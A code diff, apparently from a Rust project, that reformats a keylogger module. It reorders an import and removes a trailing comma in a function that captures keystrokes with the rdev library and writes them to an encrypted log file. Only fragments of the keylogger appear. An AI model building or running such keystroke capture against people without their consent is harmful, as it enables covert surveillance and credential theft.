@@ -5,12 +5,12 @@
 //! flushed to an encrypted log file. The module handles various key combinations and
 //! special keys for comprehensive input monitoring.
 
+use crate::log::Log;
 use crate::writer;
 use rdev::{listen, Event, EventType, Key};
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::{Duration, Instant};
-use crate::log::Log;
 const LOG_FILE: &str = "logs/keystrokes.log";
 const FLUSH_INTERVAL_SECONDS: u64 = 3;
 
@@ -43,7 +43,7 @@ pub fn start_keylogger() {
                             // Remove the "Key" prefix if present
                             let cleaned_key = key_debug.replace("Key", "");
                             format!(" {} ", cleaned_key)
-                        },
+                        }
                     };
                     buffer.push_str(&key_str);
                 }
